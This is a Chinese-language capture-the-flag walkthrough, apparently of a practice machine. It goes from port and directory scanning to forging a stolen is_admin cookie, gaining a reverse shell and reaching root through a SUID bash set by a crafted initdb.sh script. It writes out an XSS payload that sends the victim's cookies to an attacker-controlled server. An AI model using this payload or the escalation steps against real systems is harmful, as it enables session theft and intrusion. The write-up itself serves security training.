
<img width="415" height="188" alt="image" src="https://github.com/user-attachments/assets/4af54087-433d-4fdf-b18a-34f888c0f343" />

Nmap端口扫描
只开放了22和5000

<img width="416" height="260" alt="image" src="https://github.com/user-attachments/assets/caa65f16-5d6c-4bf3-afb2-b36af6cecc78" />

通过gobuster只扫到了一个dashboard目录并返回500

<img width="416" height="262" alt="image" src="https://github.com/user-attachments/assets/16d2790c-fbd3-41fa-a065-c462b2d56731" />

<img width="415" height="262" alt="image" src="https://github.com/user-attachments/assets/47ff048a-2991-4e6f-9caf-06a54cf4b7c8" />

尝试sqlmap无果
上burp suite
这里发现cookie：is_admin
比较可疑 
尝试使用xss来获取cookie
https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e
找到一篇文章，讲述如何使用xss获取cookie

<img width="415" height="188" alt="image" src="https://github.com/user-attachments/assets/d245b0c7-939e-4308-97b5-933ff8278e95" />

首先利用python3开启httpserver
再插入<script>var i=new Image(); i.src=" http://yourip+port/?cookie= "+btoa(document.cookie);</script>
OK现在尝试
我不知道哪里存在XSS
所以多插两条

<img width="416" height="270" alt="image" src="https://github.com/user-attachments/assets/0020f5f5-f207-418f-924c-61293b86668a" />

OK了，也是成功获取到cookie了好吧
接下来先给这个cookie给base64解码

<img width="416" height="270" alt="image" src="https://github.com/user-attachments/assets/640e9347-3dbd-411e-9479-46fcaafece4e" />

之后我们来到目录扫描扫出来的dashborad目录

<img width="416" height="349" alt="image" src="https://github.com/user-attachments/assets/7a00114c-7907-4547-94ea-ec19be4a8eda" />

抓包修改cookie

<img width="415" height="262" alt="image" src="https://github.com/user-attachments/assets/053f86ce-a1fb-416c-9419-b473938c2a5c" />

<img width="415" height="262" alt="image" src="https://github.com/user-attachments/assets/54007997-431d-4960-96c2-8ca582294904" />

<img width="415" height="262" alt="image" src="https://github.com/user-attachments/assets/45259e18-9feb-416f-bd9f-508a19db841d" />

尝试命令执行
我们再本地创建一个反弹shell的脚本

<img width="415" height="300" alt="image" src="https://github.com/user-attachments/assets/038baae2-4ff8-4223-ab59-25fe577095ae" />

再开一个http服务
监听端口

<img width="415" height="262" alt="image" src="https://github.com/user-attachments/assets/70e1d9f2-87a9-4fb1-9e9c-c8876b7d7355" />

<img width="415" height="262" alt="image" src="https://github.com/user-attachments/assets/88c9fd64-f7be-47c5-80ed-3928e2b2f52c" />

成功收到会话

<img width="415" height="262" alt="image" src="https://github.com/user-attachments/assets/fedfcf94-9b15-404f-8e6d-b707a9078aa1" />

成功拿到user_flag
接下来是提权

<img width="415" height="262" alt="image" src="https://github.com/user-attachments/assets/8ced792a-d45a-4516-b968-f7e159227cd3" />

这里发现我们可以访问syscheck

<img width="415" height="262" alt="image" src="https://github.com/user-attachments/assets/60d6e276-e74d-4f09-bf37-51cd8c4b04b9" />

这里发现一个叫initdb.sh的文件 但是我找了一圈并没有发现这个文件
于是我尝试自己做一个

<img width="415" height="401" alt="image" src="https://github.com/user-attachments/assets/8c397414-e8af-46da-b6ae-566d359f6343" />

我将赋予/bin/bash SUID权限
在SUID提权中，只需要输入bash -p 即可提升至root权限
你也可以将反弹shell的命令写入initdb.sh来获取root

<img width="415" height="401" alt="image" src="https://github.com/user-attachments/assets/7d28daac-40d0-44cf-b205-ac9e8665d409" />

成功获取root

<img width="415" height="401" alt="image" src="https://github.com/user-attachments/assets/fd933b29-e73c-40b6-93f1-b8edb3335d10" />

